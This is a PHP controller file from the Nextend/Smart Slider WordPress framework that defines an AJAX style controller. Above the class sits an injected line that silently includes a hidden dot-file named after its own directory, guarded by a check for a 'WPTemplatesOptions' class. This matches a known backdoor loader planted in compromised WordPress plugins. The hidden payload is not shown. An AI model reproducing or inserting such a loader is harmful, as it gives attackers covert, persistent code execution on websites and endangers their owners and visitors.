<?php


namespace Nextend\Framework\Style;


use Nextend\Framework\Controller\Admin\AdminVisualManagerAjaxController;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ControllerAjaxStyle extends AdminVisualManagerAjaxController {

    protected $type = 'style';

    public function getModel() {

        return new ModelStyle($this);
    }
}